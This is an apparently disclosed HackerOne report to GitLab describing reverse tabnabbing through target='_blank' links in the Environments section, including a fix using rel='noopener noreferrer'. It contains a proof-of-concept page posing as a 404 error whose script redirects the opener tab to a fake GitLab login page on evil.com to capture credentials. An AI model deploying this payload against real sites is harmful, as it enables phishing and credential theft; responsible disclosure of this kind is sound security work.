# Gitlab.com is vulnerable to reverse tabnabbing.

## Report Details
- **Report ID**: 211065
- **URL**: https://hackerone.com/reports/211065
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-03-06T10:41:48.808Z
- **Disclosed**: 2017-03-21T15:58:42.727Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
Dear GitLab bug bounty team,

# Summary
---

Gitlab.com is vulnerable to reverse tabnabbing, since you use `target="_blank"` on links in the *Environments* section.

{F166659}

# Why does this vulnerability exist?
---

The following `<a href="https://example.com/" target="_blank">link</a>` is vulnerable to reverse tabnabbing, because it uses `target="_blank"`:

~~~
<a target="_blank" class="btn external-url" href="https://evil.com"><i class="fa fa-external-link"></i>
</a>
~~~

This means the page that opens in a new tab can access the initial tab and change its location using the `window.opener` property.

# What are the exploits?
---

I used some simple tricks to further increase the chances of this attack working. I added a link to a website which contains the following code:

~~~
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.2.15 (Red Hat) Server at gitlab.com Port 443</address>
    <script>
        window.opener.location.assign('https://evil.com/ph-login.html');
    </script>
</body>
</html>
~~~

{F166662}

The new tab displays a 404 page which increases the likelihood that the victim will return to the previous tab. While the victim visited the attacker's page, the initial tab was redirected to `https://evil.com/ph-login.html`. This page looks exactly like the GitLab login form and asks the victim to re-enter their login credentials.

{F166660}

# How can this be fixed?
---

In order to mitigate this issue, developers are encouraged to use `rel="nofollow noopener noreferrer"` as follows:

~~~
<a target="_blank" class="btn external-url" href="https://evil.com" rel="nofollow noopener noreferrer"><i class="fa fa-external-link"></i>
</a>
~~~

Now when you click on this link, the attacker cannot access the initial tab.

For more on reverse tabnabbing, please refer to the following page: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/

If you require further information feel free to contact me.

Yours sincerely,
Ed

## Attachments
- environments-gitlab.PNG
- login-gitlab.PNG
- 404-gitlab.PNG
